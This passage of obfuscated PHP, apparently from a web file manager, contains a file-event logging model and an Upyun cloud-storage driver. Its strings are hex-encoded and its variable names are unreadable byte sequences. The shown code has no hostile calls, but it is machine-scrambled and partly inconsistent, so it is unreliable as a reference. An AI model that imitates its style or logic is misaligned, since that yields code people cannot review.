$ìÃü©û = Model($Ô ¶°¶–[592])->listData($á‡ô§®“[$Ô ¶°¶–[2145]]); if (!$ìÃü©û) { return !1; $Îßº‘æ = Model($Ô ¶°¶–[592])->listData(); $Í«Ëôñë = array_filter_by_field($Îßº‘æ, $Ô ¶°¶–[507], $Ô ¶°¶–[241]); return $Í«Ëôñë; } $¹Ä½í¼ = array_field_key($ìÃü©û, array($Ô ¶°¶–[492], $Ô ¶°¶–[32], $Ô ¶°¶–[507], $Ô ¶°¶–[2060], $Ô ¶°¶–[2061])); $¹Ä½í¼[$Ô ¶°¶–[2274]] = $á‡ô§®“; return $¹Ä½í¼; } else { return array($Ô ¶°¶–[513] => 0, $Ô ¶°¶–[2043] => $á‡ô§®“[$Ô ¶°¶–[2208]], $Ô ¶°¶–[514] => $Ô ¶°¶–[12], $Ô ¶°¶–[2060] => $Ô ¶°¶–[2275]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\x72\x63\x65\x5f\145\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\x54\151\155\x65", "\164\x69\155\145", "\151\156\163\145\162\164", "\146\x75\x6e\143\164\151\x6f\156"), array("\x64\145\163\143", '', "\151\x6e\163\x65\162\x74\54\165\x70\x64\x61\x74\x65\x2c\163\145\x6c\x65\143\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($½¢ÙøÄˆ, $«À¹ô™Ö, $¦¦ëïƒ² = '') { $ùÜæ– =& $_SERVER[¬ÏÕ§Áú]; if (!$this->eventSave) { return; } $‘›Ë—û = Model($ùÜæ–[1483])->sourceInfo($½¢ÙøÄˆ); if (!$‘›Ë—û) { return !1; } if ($this->isDisableEvent($‘›Ë—û, $«À¹ô™Ö)) { return; } if ($¦¦ëïƒ² && is_string($¦¦ëïƒ²)) { $¦¦ëïƒ² = array($ùÜæ–[2076] => $¦¦ëïƒ²); } $Ÿí¯­± = KodUser::id(); $ˆ¤ùáÃ = array($ùÜæ–[511] => $½¢ÙøÄˆ, $ùÜæ–[2276] => $‘›Ë—û[$ùÜæ–[203]], $ùÜæ–[2277] => $‘›Ë—û[$ùÜæ–[32]], $ùÜæ–[603] => !empty($‘›Ë—û[$ùÜæ–[603]]) ? $‘›Ë—û[$ùÜæ–[603]] : $ùÜæ–[12], $ùÜæ–[1828] => $Ÿí¯­±, $ùÜæ–[516] => $«À¹ô™Ö, $ùÜæ–[1830] => $¦¦ëïƒ²); $this->addSystemLog($«À¹ô™Ö, $ˆ¤ùáÃ); unset($ˆ¤ùáÃ[$ùÜæ–[2277]], $ˆ¤ùáÃ[$ùÜæ–[603]]); return $this->add($ˆ¤ùáÃ); } private function addSystemLog($–Ç²Š«ê, $Äáè‡õØ) { $¹¢Î“ñİ =& $_SERVER[¬ÏÕ§Áú]; if ($–Ç²Š«ê == $¹¢Î“ñİ[2278]) { $–Ç²Š«ê = $Äáè‡õØ[$¹¢Î“ñİ[545]][$¹¢Î“ñİ[2279]]; } else { if (in_array($–Ç²Š«ê, array($¹¢Î“ñİ[2017], $¹¢Î“ñİ[2280]))) { $–Ç²Š«ê = $Äáè‡õØ[$¹¢Î“ñİ[545]][$¹¢Î“ñİ[181]]; } } $­ü‰‚·ö = array_merge($Äáè‡õØ, array($¹¢Î“ñİ[2281] => $Äáè‡õØ[$¹¢Î“ñİ[204]], $¹¢Î“ñİ[2282] => $Äáè‡õØ[$¹¢Î“ñİ[2282]])); Hook::trigger($¹¢Î“ñİ[2283], $¹¢Î“ñİ[2284] . $–Ç²Š«ê, $Äáè‡õØ); Model($¹¢Î“ñİ[1982])->addLog($¹¢Î“ñİ[2284] . $–Ç²Š«ê, $­ü‰‚·ö); } private function isDisableEvent($²¥†§½ƒ, $Æè„ìá˜) { $Ãš¢ó¬¢ =& $_SERVER[¬ÏÕ§Áú]; if ($²¥†§½ƒ[$Ãš¢ó¬¢[201]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Æè„ìá˜ == $Ãš¢ó¬¢[1282]) { return !1; } return !0; } public function eventCreate($³é¾Ã¨µ, $ù§Å˜ûÏ) { $‡–®¬Öû =& $_SERVER[¬ÏÕ§Áú]; $ÇÉ±ª¡µ = Model($‡–®¬Öû[1483])->sourceInfo($³é¾Ã¨µ); $²±Ô«ÖÄ = array($‡–®¬Öû[2279] => $ù§Å˜ûÏ, $‡–®¬Öû[32] => $ÇÉ±ª¡µ[$‡–®¬Öû[32]]); return $this->addEvent($³é¾Ã¨µ, $‡–®¬Öû[2278], $²±Ô«ÖÄ); } public function eventFileEdit($Èšöô©Ğ) { $•‚…ÍÃ =& $_SERVER[¬ÏÕ§Áú]; $ÌĞ¡³© = array($•‚…ÍÃ[2285] => $_SERVER[$•‚…ÍÃ[2286]], $•‚…ÍÃ[2287] => strtolower(ACTION)); if (isset($GLOBALS[$•‚…ÍÃ[7]][$•‚…ÍÃ[2288]])) { $ÌĞ¡³©[$•‚…ÍÃ[2288]] = $•‚…ÍÃ[101]; } return $this->addEvent($Èšöô©Ğ, $•‚…ÍÃ[2007], $ÌĞ¡³©); } public function eventRecycle($¾¶Áœ½œ, $ÚÃË¸¹) { return $this->addEvent($¾¶Áœ½œ, $_SERVER[¬ÏÕ§Áú][2280], $ÚÃË¸¹); } private static $_removeLast = ''; public function eventRemove($ ÕîÆ¨„) { $Ê‡¹âŠ· =& $_SERVER[¬ÏÕ§Áú]; self::$_removeLast = $ ÕîÆ¨„; $¸÷Áï‘™ = Model($Ê‡¹âŠ·[1483])->sourceInfo($ ÕîÆ¨„); $‘ã¾¼ ÷ = array_field_key($¸÷Áï‘™, array($Ê‡¹âŠ·[204], $Ê‡¹âŠ·[562], $Ê‡¹âŠ·[525], $Ê‡¹âŠ·[605])); $üÙû‚Ë = array($Ê‡¹âŠ·[181] => $¸÷Áï‘™[$Ê‡¹âŠ·[32]], $Ê‡¹âŠ·[2287] => ACTION, $Ê‡¹âŠ·[2289] => $‘ã¾¼ ÷); return $this->addEvent($¸÷Áï‘™[$Ê‡¹âŠ·[203]], $Ê‡¹âŠ·[1282], $üÙû‚Ë); } public function eventShare($œÛú²ü, $Ò¯›) { return $this->addEvent($œÛú²ü, $_SERVER[¬ÏÕ§Áú][2017], $Ò¯›); } public function eventMove($¦šÕşÇ‚, $ô’ìĞ‰, $Ñ»ÆÀÎœ) { $Êı¤µ =& $_SERVER[¬ÏÕ§Áú]; if (self::$_removeLast == $¦šÕşÇ‚) { return; } $õ ãçë = Model($Êı¤µ[1483]); $ËëŞøşã = $õ ãçë->sourceInfo($¦šÕşÇ‚); $˜ˆ¤‹® = $õ ãçë->sourceInfo($ô’ìĞ‰); $©ÊÈ×¾ = $õ ãçë->sourceInfo($Ñ»ÆÀÎœ); $õ­®‹¡œ = array($Êı¤µ[1294] => $ô’ìĞ‰, $Êı¤µ[2290] => $˜ˆ¤‹®[$Êı¤µ[32]], $Êı¤µ[2246] => !empty($˜ˆ¤‹®[$Êı¤µ[603]]) ? $˜ˆ¤‹®[$Êı¤µ[603]] : $Êı¤µ[12], $Êı¤µ[1295] => $Ñ»ÆÀÎœ, $Êı¤µ[2291] => $©ÊÈ×¾[$Êı¤µ[32]], $Êı¤µ[2292] => !empty($©ÊÈ×¾[$Êı¤µ[603]]) ? $©ÊÈ×¾[$Êı¤µ[603]] : $Êı¤µ[12]); $this->addEvent($¦šÕşÇ‚, $Êı¤µ[644], $õ­®‹¡œ); $ËëŞøşã = $õ ãçë->sourceInfo($¦šÕşÇ‚); $õ­®‹¡œ = array($Êı¤µ[204] => $ËëŞøşã[$Êı¤µ[204]], $Êı¤µ[32] => $ËëŞøşã[$Êı¤µ[32]]); $this->addEvent($ô’ìĞ‰, $Êı¤µ[2293], $õ­®‹¡œ); } public function eventCopy($ƒú£••‡) { $this->eventCreate($ƒú£••‡, $_SERVER[¬ÏÕ§Áú][642]); } public function eventRename($àÔ×ÍŞ, $€­ŸéÕ£, $ ä™ı³Œ) { $²üƒÅ©Â =& $_SERVER[¬ÏÕ§Áú]; $äáÒŸª = array($²üƒÅ©Â[1294] => $€­ŸéÕ£, $²üƒÅ©Â[1295] => $ ä™ı³Œ); return $this->addEvent($àÔ×ÍŞ, $²üƒÅ©Â[1497], $äáÒŸª); } public function eventAddComment($¢Ş³Ü€, $×ÖÍš) { return $this->addEvent($¢Ş³Ü€, $_SERVER[¬ÏÕ§Áú][2294], $×ÖÍš); } public function eventAddDesc($î³Ïªğ¦, $Ù‰É›¸ö) { return $this->addEvent($î³Ïªğ¦, $_SERVER[¬ÏÕ§Áú][2295], $Ù‰É›¸ö); } public function listBySource($â—©¼ËŠ) { $Õˆµàèş =& $_SERVER[¬ÏÕ§Áú]; $Ë„–€ = Model($Õˆµàèş[1483])->sourceInfo($â—©¼ËŠ); $ÊØ›Ëó = array($Õˆµàèş[511] => $â—©¼ËŠ); if ($Ë„–€[$Õˆµàèş[505]] == $Õˆµàèş[101]) { $ø‚Üöû = Model($Õˆµàèş[1483])->listSearchChildren($â—©¼ËŠ, 20000); $ø‚Üöû[] = $â—©¼ËŠ . $Õˆµàèş[69]; $ÊØ›Ëó = array($Õˆµàèş[204] => array($Õˆµàèş[7], $ø‚Üöû)); } $ô·¦®ïÙ = $this->where($ÊØ›Ëó)->order($Õˆµàèş[2296])->selectPage(); if ($ô·¦®ïÙ[$Õˆµàèş[453]][$Õˆµàèş[454]] == 0) { $ô·¦®ïÙ[$Õˆµàèş[453]][$Õˆµàèş[454]] = 1; $ô·¦®ïÙ[$Õˆµàèş[456]] = array(array($Õˆµàèş[511] => $â—©¼ËŠ, $Õˆµàèş[2276] => $Ë„–€[$Õˆµàèş[203]], $Õˆµàèş[1828] => $Ë„–€[$Õˆµàèş[546]], $Õˆµàèş[516] => $Õˆµàèş[2297], $Õˆµàèş[517] => $Ë„–€[$Õˆµàèş[244]], $Õˆµàèş[1830] => $Õˆµàèş[12])); } return $this->eventListParse($ô·¦®ïÙ, $â—©¼ËŠ); } private function eventListParse($ó÷°éó¥, $ãÓ Ñ”Ó) { $ÏÊ²©úÂ =& $_SERVER[¬ÏÕ§Áú]; $‡ğ• ŠÍ = $ó÷°éó¥[$ÏÊ²©úÂ[456]]; $æ€·¹° = array_to_keyvalue($‡ğ• ŠÍ, $ÏÊ²©úÂ[12], $ÏÊ²©úÂ[204]); $¤ğø›¤² = array_to_keyvalue($‡ğ• ŠÍ, $ÏÊ²©úÂ[12], $ÏÊ²©úÂ[2282]); foreach ($‡ğ• ŠÍ as $ã¡™‹óÎ) { $ÃÏä¨æº = $ã¡™‹óÎ[$ÏÊ²©úÂ[545]]; if ($ã¡™‹óÎ[$ÏÊ²©úÂ[33]] == $ÏÊ²©úÂ[644] && isset($ÃÏä¨æº[$ÏÊ²©úÂ[1294]])) { $æ€·¹°[] = $ÃÏä¨æº[$ÏÊ²©úÂ[1294]] . $ÏÊ²©úÂ[12]; $æ€·¹°[] = $ÃÏä¨æº[$ÏÊ²©úÂ[1295]] . $ÏÊ²©úÂ[12]; } if ($ã¡™‹óÎ[$ÏÊ²©úÂ[33]] == $ÏÊ²©úÂ[2293] && isset($ÃÏä¨æº[$ÏÊ²©úÂ[204]])) { $æ€·¹°[] = $ÃÏä¨æº[$ÏÊ²©úÂ[204]] . $ÏÊ²©úÂ[12]; } } $æ€·¹° = array_merge($æ€·¹°, $¤ğø›¤², array($ãÓ Ñ”Ó . $ÏÊ²©úÂ[12])); $æ€·¹° = array_unique($æ€·¹°); $¼İ«ùÄ¡ = array_unique(array_to_keyvalue($‡ğ• ŠÍ, $ÏÊ²©úÂ[12], $ÏÊ²©úÂ[1837])); $ÖÈ×‹ıø = Model($ÏÊ²©úÂ[618])->userListInfo($¼İ«ùÄ¡); $ËÔ£²å† = Model($ÏÊ²©úÂ[946])->sourceListInfo($æ€·¹°, !0); foreach ($‡ğ• ŠÍ as &$ã¡™‹óÎ) { if ($ã¡™‹óÎ[$ÏÊ²©úÂ[33]] == $ÏÊ²©úÂ[644] && isset($ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[1294]])) { $ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[1294]] = $ËÔ£²å†[$ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[1294]]]; $ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[1295]] = $ËÔ£²å†[$ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[1295]]]; } if ($ã¡™‹óÎ[$ÏÊ²©úÂ[33]] == $ÏÊ²©úÂ[2293] && isset($ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[204]])) { $ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[204]] = $ËÔ£²å†[$ã¡™‹óÎ[$ÏÊ²©úÂ[545]][$ÏÊ²©úÂ[204]]]; } $ã¡™‹óÎ[$ÏÊ²©úÂ[100]] = $ËÔ£²å†[$ã¡™‹óÎ[$ÏÊ²©úÂ[204]]]; $ã¡™‹óÎ[$ÏÊ²©úÂ[2298]] = $ËÔ£²å†[$ã¡™‹óÎ[$ÏÊ²©úÂ[2282]]]; if ($ã¡™‹óÎ[$ÏÊ²©úÂ[33]] == $ÏÊ²©úÂ[1282]) { $ã¡™‹óÎ[$ÏÊ²©úÂ[2298]] = $ã¡™‹óÎ[$ÏÊ²©úÂ[100]]; $ã¡™‹óÎ[$ÏÊ²©úÂ[2282]] = $ã¡™‹óÎ[$ÏÊ²©úÂ[2298]][$ÏÊ²©úÂ[204]]; $ã¡™‹óÎ[$ÏÊ²©úÂ[100]] = !1; $ã¡™‹óÎ[$ÏÊ²©úÂ[204]] = $ÏÊ²©úÂ[12]; } $ã¡™‹óÎ[$ÏÊ²©úÂ[2219]] = $ÖÈ×‹ıø[$ã¡™‹óÎ[$ÏÊ²©úÂ[1837]]]; } unset($ã¡™‹óÎ); $ó÷°éó¥[$ÏÊ²©úÂ[456]] = $‡ğ• ŠÍ; return $ó÷°éó¥; } public function removeBySource($ê™¥) { $õ°‡— = array($_SERVER[¬ÏÕ§Áú][511] => $ê™¥); $this->where($õ°‡—)->remove(); } } goto aŸÚŞğœ‚; E “Àà‡´Æ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\57\57\x76\60\x2e\141\160\151\x2e\165\x70\x79\x75\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¯Ÿ×ıØ¹) { parent::__construct(); $this->_init($¯Ÿ×ıØ¹); } public function _init($¾äç¹Çó) { $Áœ¡–‚ =& $_SERVER[¬ÏÕ§Áú]; foreach ($¾äç¹Çó as $÷Æ¶óÒÍ => $¿Â³Â–°) { if (isset($this->{$÷Æ¶óÒÍ})) { $this->{$÷Æ¶óÒÍ} = $¿Â³Â–°; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Áœ¡–‚[1608] . LNG($Áœ¡–‚[1527])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($•î¼†ÍÈ, $­‰ùºîá = "\x47\x45\124") { $¨»ÜÏùÇ =& $_SERVER[¬ÏÕ§Áú]; $¼˜ÅÜÃ = gmdate($¨»ÜÏùÇ[1556]); $©²€ÚãÁ = base64_encode(hash_hmac($¨»ÜÏùÇ[1609], "{$­‰ùºîá}\46{$•î¼†ÍÈ}\46{$¼˜ÅÜÃ}", md5("{$this->userpass}"), !0)); $¥÷Ó¶ãâ = array("\x41\x75\x74\x68\157\x72\x69\x7a\141\x74\151\157\x6e\x3a\x55\120\131\x55\x4e\40{$this->username}\72{$©²€ÚãÁ}", "\x44\141\164\x65\x3a{$¼˜ÅÜÃ}"); return $¥÷Ó¶ãâ; } public function ussRequest($ˆœ©ˆæÌ, $·İ¬ú¾£ = "\107\x45\124", $¢±Ú‹È† = false, $öûö»úß = false, $ŒŸµÇƒ‡ = false) { $ÂÎæ•ì» =& $_SERVER[¬ÏÕ§Áú]; $ˆœ©ˆæÌ = trim($ˆœ©ˆæÌ, $ÂÎæ•ì»[8]); $šÆÆ¸ˆ = "\57{$this->bucket}\57" . rawurlencode($ˆœ©ˆæÌ); $ÚŞÌíû® = $this->ussHeaders($šÆÆ¸ˆ, $·İ¬ú¾£); if ($öûö»úß) { $ÚŞÌíû® = array_merge($ÚŞÌíû®, $öûö»úß); } $­ÆúœˆÅ = url_request($this->endpoint . $šÆÆ¸ˆ, $·İ¬ú¾£, $¢±Ú‹È†, $ÚŞÌíû®, $ŒŸµÇƒ‡); if (!$­ÆúœˆÅ) { $ŒùË = LNG($ÂÎæ•ì»[1610]); $this->writeLog($ŒùË); return array($ÂÎæ•ì»[1352] => !1, $ÂÎæ•ì»[1342] => $ŒùË); } if (strtolower($·İ¬ú¾£) == $ÂÎæ•ì»[240] || in_array($­ÆúœˆÅ[$ÂÎæ•ì»[1352]], array($ÂÎæ•ì»[274], $ÂÎæ•ì»[1611]))) { $¢±Ú‹È† = $­ÆúœˆÅ[$ÂÎæ•ì»[1612]]; if (!$­ÆúœˆÅ[$ÂÎæ•ì»[863]]) { $¢±Ú‹È† = isset($¢±Ú‹È†[0]) ? $¢±Ú‹È†[0] : $ÂÎæ•ì»[12]; } } else { $¢±Ú‹È† = json_decode($­ÆúœˆÅ[$ÂÎæ•ì»[1342]], !0); if (!$¢±Ú‹È†) { $¢±Ú‹È† = $­ÆúœˆÅ[$ÂÎæ•ì»[1342]]; } else { if (!$­ÆúœˆÅ[$ÂÎæ•ì»[863]] && isset($¢±Ú‹È†[$ÂÎæ•ì»[1613]])) { $¢±Ú‹È† = $¢±Ú‹È†[$ÂÎæ•ì»[1613]]; } } } if (!$­ÆúœˆÅ[$ÂÎæ•ì»[863]]) { $this->writeLog($this->__errorMessage($¢±Ú‹È†)); } return array($ÂÎæ•ì»[1352] => $­ÆúœˆÅ[$ÂÎæ•ì»[863]], $ÂÎæ•ì»[1342] => $¢±Ú‹È†); } private function __errorMessage($ÄçĞš¦§) { $’¸‡‡ø¯ =& $_SERVER[¬ÏÕ§Áú]; if (!$ÄçĞš¦§) { return $’¸‡‡ø¯[12]; } static $İëˆ­š‰ = null; if (!$İëˆ­š‰) { $İëˆ­š‰ = I18n::getType(); } if ($İëˆ­š‰ != $’¸‡‡ø¯[1565]) { return $ÄçĞš¦§; } $­’…â³ü = array($’¸‡‡ø¯[1614] => $’¸‡‡ø¯[1615], $’¸‡‡ø¯[1616] => $’¸‡‡ø¯[1617], $’¸‡‡ø¯[1618] => $’¸‡‡ø¯[1617], $’¸‡‡ø¯[1619] => $’¸‡‡ø¯[1620], $’¸‡‡ø¯[1621] => $’¸‡‡ø¯[1622], $’¸‡‡ø¯[1623] => $’¸‡‡ø¯[1624], $’¸‡‡ø¯[1625] => $’¸‡‡ø¯[1626]); return isset($­’…â³ü[$ÄçĞš¦§]) ? $­’…â³ü[$ÄçĞš¦§] : $ÄçĞš¦§; } public function mkfile($€´ôµ“ , $ØİÍ¶Ã = '', $Çˆ·çà† = REPEAT_RENAME) { if ($this->setContent($€´ôµ“ , $ØİÍ¶Ã)) { return $this->getPathOuter($€´ôµ“ ); } return !1; } public function mkdir($ÖñÆ’åä, $„©¿ÇÄ¨ = REPEAT_SKIP) { $”Šœƒë =& $_SERVER[¬ÏÕ§Áú]; $¡”äææ = trim($ÖñÆ’åä, $”Šœƒë[8]); if ($this->_isFolder($¡”äææ)) { return $this->getPathOuter($¡”äææ); } $Šù£Ÿ®‘ = array($”Šœƒë[1627]); $È°†è¹° = $this->ussRequest($¡”äææ, $”Šœƒë[300], !1, $Šù£Ÿ®‘); return $È°†è¹°[$”Šœƒë[1352]] ? $this->getPathOuter($¡”äææ) : !1; } public function copyFile($­¯È•ñ, $Ø§‹÷øù) { $ŒŸƒƒ‚á =& $_SERVER[¬ÏÕ§Áú]; $·—±ñ¬è = array($ŒŸƒƒ‚á[1628] . "\57{$this->bucket}\57{$­¯È•ñ}", $ŒŸƒƒ‚á[1629]); $ƒ×À¹ = $this->ussRequest($Ø§‹÷øù, $ŒŸƒƒ‚á[266], !1, $·—±ñ¬è); return $ƒ×À¹[$ŒŸƒƒ‚á[1352]] ? !0 : $this->getPathOuter($Ø§‹÷øù); } public function moveFile($‹ÔçÊ¬â, $ªÃëØ¥‡) { $ĞÙµå÷ =& $_SERVER[¬ÏÕ§Áú]; $Ù¼´½± = array($ĞÙµå÷[1630] . "\x2f{$this->bucket}\x2f{$‹ÔçÊ¬â}", $ĞÙµå÷[1629]); $¸—ªïê = $this->ussRequest($ªÃëØ¥‡, $ĞÙµå÷[266], !1, $Ù¼´½±); return $¸—ªïê[$ĞÙµå÷[1352]] ? !0 : $this->getPathOuter($ªÃëØ¥‡); } public function delFile($îñúŸÒ) { $™„ÑƒƒÖ =& $_SERVER[¬ÏÕ§Áú]; $óëˆÀÌ = $this->ussRequest($îñúŸÒ, $™„ÑƒƒÖ[1631]); return $óëˆÀÌ[$™„ÑƒƒÖ[1352]] ? !0 : !1; } public function delFolder($¾œ®½ê) { $åÕÀÍ¹¾ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->exist($¾œ®½ê)) { return !0; } $this->listItemCache = !1; $ø—Æüæ = $äçŸı¬À = array(); $this->fileList($¾œ®½ê, $ø—Æüæ, $äçŸı¬À, !0); $this->listItemCache = !0; foreach ($äçŸı¬À as $Ø˜—õÆ) { $õÖ•×²Å = $this->ussRequest($Ø˜—õÆ[$åÕÀÍ¹¾[32]], $åÕÀÍ¹¾[1631]); if (!$õÖ•×²Å[$åÕÀÍ¹¾[1352]]) { return !1; } } usort($ø—Æüæ, function ($­Úâ±÷†, $çìÔÌòò) { $˜àëÛùÃ =& $_SERVER[¬ÏÕ§Áú]; return substr_count($çìÔÌòò, $˜àëÛùÃ[8]) - substr_count($­Úâ±÷†, $˜àëÛùÃ[8]); }); foreach ($ø—Æüæ as $¸İÁµÍØ) { $õÖ•×²Å = $this->ussRequest($¸İÁµÍØ, $åÕÀÍ¹¾[1631]); if (!$õÖ•×²Å[$åÕÀÍ¹¾[1352]]) { return !1; } } $õÖ•×²Å = $this->ussRequest($¾œ®½ê, $åÕÀÍ¹¾[1631]); return $õÖ•×²Å[$åÕÀÍ¹¾[1352]]; } public function rename($èÁˆ¯İ“, $Ğ¢ÕâÔÉ) { if ($this->isFile($èÁˆ¯İ“)) { $Ğ¢ÕâÔÉ = get_path_father($èÁˆ¯İ“) . $Ğ¢ÕâÔÉ; return $this->moveFile($èÁˆ¯İ“, $Ğ¢ÕâÔÉ); } return $this->renameObject($èÁˆ¯İ“, $Ğ¢ÕâÔÉ); } public function fileInfo($ù­Øã, $‡¹ôà”Ÿ = false, $–°ßÖĞ = array()) { $™»ìŞ§€ =& $_SERVER[¬ÏÕ§Áú]; $µøõ³×Ö = array($™»ìŞ§€[32] => $this->pathThis($ù­Øã), $™»ìŞ§€[97] => $this->getPathOuter($™»ìŞ§€[8] . $ù­Øã), $™»ìŞ§€[33] => $™»ìŞ§€[243], $™»ìŞ§€[89] => isset($–°ßÖĞ[$™»ìŞ§€[89]]) ? $–°ßÖĞ[$™»ìŞ§€[89]] : 0, $™»ìŞ§€[179] => $this->ext($ù­Øã)); if ($‡¹ôà”Ÿ) { return $µøõ³×Ö; } $µøõ³×Ö[$™»ìŞ§€[244]] = $µøõ³×Ö[$™»ìŞ§€[98]] = 0; $µøõ³×Ö[$™»ìŞ§€[245]] = $µøõ³×Ö[$™»ìŞ§€[246]] = !0; if (empty($–°ßÖĞ)) { $–°ßÖĞ = $this->objectMeta($ù­Øã); if (!$–°ßÖĞ) { return $µøõ³×Ö; } } $µøõ³×Ö[$™»ìŞ§€[244]] = intval($–°ßÖĞ[$™»ìŞ§€[1632]]); $µøõ³×Ö[$™»ìŞ§€[98]] = intval($–°ßÖĞ[$™»ìŞ§€[1633]]); $µøõ³×Ö[$™»ìŞ§€[89]] = $–°ßÖĞ[$™»ìŞ§€[89]]; return $µøõ³×Ö; } public function folderInfo($†ÀëáÇ—, $ƒ  à…Ì = false) { $´ÅÃ‡ÈÂ =& $_SERVER[¬ÏÕ§Áú]; $Ãİş¤€€ = array($´ÅÃ‡ÈÂ[32] => $this->pathThis($†ÀëáÇ—), $´ÅÃ‡ÈÂ[97] => $this->getPathOuter($´ÅÃ‡ÈÂ[8] . $†ÀëáÇ—), $´ÅÃ‡ÈÂ[33] => $´ÅÃ‡ÈÂ[88]); if ($ƒ  à…Ì) { return $Ãİş¤€€; } $Ãİş¤€€[$´ÅÃ‡ÈÂ[244]] = $Ãİş¤€€[$´ÅÃ‡ÈÂ[98]] = 0; $Ãİş¤€€[$´ÅÃ‡ÈÂ[245]] = $Ãİş¤€€[$´ÅÃ‡ÈÂ[246]] = !0; if (empty($É¿ÇêÁŒ)) { $É¿ÇêÁŒ = $this->objectMeta($†ÀëáÇ—); if (!$É¿ÇêÁŒ) { return $Ãİş¤€€; } } $Ãİş¤€€[$´ÅÃ‡ÈÂ[244]] = intval($É¿ÇêÁŒ[$´ÅÃ‡ÈÂ[1632]]); $Ãİş¤€€[$´ÅÃ‡ÈÂ[98]] = intval($É¿ÇêÁŒ[$´ÅÃ‡ÈÂ[1633]]); return $Ãİş¤€€; } private function listObjs($èÕ—×°æ, $™­Ã»±ï = 0, $óË°ùö = 1000) { $Âªã¶ç‹ =& $_SERVER[¬ÏÕ§Áú]; $¾ú’¹Ä¸ = array($Âªã¶ç‹[1634], $Âªã¶ç‹[1635] . $óË°ùö); if ($™­Ã»±ï) { $¾ú’¹Ä¸[] = $Âªã¶ç‹[1636] . $™­Ã»±ï; } $ï•ÕˆÂÓ = $this->ussRequest($èÕ—×°æ, $Âªã¶ç‹[1558], !1, $¾ú’¹Ä¸); return !$ï•ÕˆÂÓ[$Âªã¶ç‹[1352]] ? !1 : $ï•ÕˆÂÓ[$Âªã¶ç‹[1342]]; } private function fileList($ÇÑüòÎ¨, &$§ñÁ–îÉ, &$˜Ï¯¦Ö¡, $Œ”Áî£ = false) { $¶ªú“—Œ =& $_SERVER[¬ÏÕ§Áú]; $òâô²´ß = $¶ªú“—Œ[12]; $ßÙéšÈİ = 1000; $•Ç×ŒÒà = rtrim($ÇÑüòÎ¨, $¶ªú“—Œ[8]) . $¶ªú“—Œ[8]; while (!0) { check_abort(); $·ªÊÜø = $this->listObjs($ÇÑüòÎ¨, $òâô²´ß, $ßÙéšÈİ); if (!$·ªÊÜø) { return !1; } $òâô²´ß = isset($·ªÊÜø[$¶ªú“—Œ[1637]]) ? $·ªÊÜø[$¶ªú“—Œ[1637]] : $¶ªú“—Œ[12]; $¼”šÆ = isset($·ªÊÜø[$¶ªú“—Œ[1638]]) ? $·ªÊÜø[$¶ªú“—Œ[1638]] : array(); foreach ($¼”šÆ as $á‘ùùé) { $è¼ÌúŒû = $á‘ùùé[$¶ªú“—Œ[33]] == $¶ªú“—Œ[88] ? !0 : !1; $êÜçº€Ç = ltrim($•Ç×ŒÒà . $á‘ùùé[$¶ªú“—Œ[32]], $¶ªú“—Œ[8]) . ($è¼ÌúŒû ? $¶ªú“—Œ[8] : $¶ªú“—Œ[12]); $¢Öú½–© = array($¶ªú“—Œ[32] => $êÜçº€Ç, $¶ªú“—Œ[33] => $è¼ÌúŒû ? $¶ªú“—Œ[88] : $¶ªú“—Œ[243], $¶ªú“—Œ[89] => $á‘ùùé[$¶ªú“—Œ[423]], $¶ªú“—Œ[1633] => $á‘ùùé[$¶ªú“—Œ[1639]]); $this->cacheMethodInfoSet($êÜçº€Ç, $è¼ÌúŒû, $¢Öú½–©); if ($è¼ÌúŒû) { $§ñÁ–îÉ[] = $êÜçº€Ç; if ($Œ”Áî£) { $this->fileList($êÜçº€Ç, $§ñÁ–îÉ, $˜Ï¯¦Ö¡, $Œ”Áî£); } continue; } $˜Ï¯¦Ö¡[] = $¢Öú½–©; } if (count($¼”šÆ) < $ßÙéšÈİ) { break; } } $this->cacheMethodInfoSet($ÇÑüòÎ¨, !0); } public function listPath($×Ùóìûæ, $¡ÉŒÑŒã = false) { $Çšˆ…–« =& $_SERVER[¬ÏÕ§Áú]; $¶‘òÀ¡„ = $Ùø³Çâ— = array(); $this->fileList($×Ùóìûæ, $¶‘òÀ¡„, $Ùø³Çâ—); foreach ($¶‘òÀ¡„ as $ÅşŠßœµ => $Ç¹üÜãÃ) { $¶‘òÀ¡„[$ÅşŠßœµ] = $this->folderInfo($Ç¹üÜãÃ, $¡ÉŒÑŒã); } foreach ($Ùø³Çâ— as $ÅşŠßœµ => $Ç¹üÜãÃ) { $Ùø³Çâ—[$ÅşŠßœµ] = $this->fileInfo($Ç¹üÜãÃ[$Çšˆ…–«[32]], $¡ÉŒÑŒã, $Ç¹üÜãÃ); } return array($Çšˆ…–«[95] => $¶‘òÀ¡„, $Çšˆ…–«[96] => $Ùø³Çâ—); } public function has($’°æ«‘Ñ, $¥ÏÕèôÃ = false, $¢î‰÷¢ş = true) { $îÑÄˆ©à =& $_SERVER[¬ÏÕ§Áú]; $¬†Öã®° = $îÑÄˆ©à[12]; $¦ÏÑàø• = 500; $óƒó¸¬© = 0; $—¥Øô§ñ = 0; $ê±Ÿ½òß = rtrim($’°æ«‘Ñ, $îÑÄˆ©à[8]) . $îÑÄˆ©à[8]; while (!0) { check_abort(); $Âš¨²À© = $this->listObjs($’°æ«‘Ñ, $¬†Öã®°, $¦ÏÑàø•); if 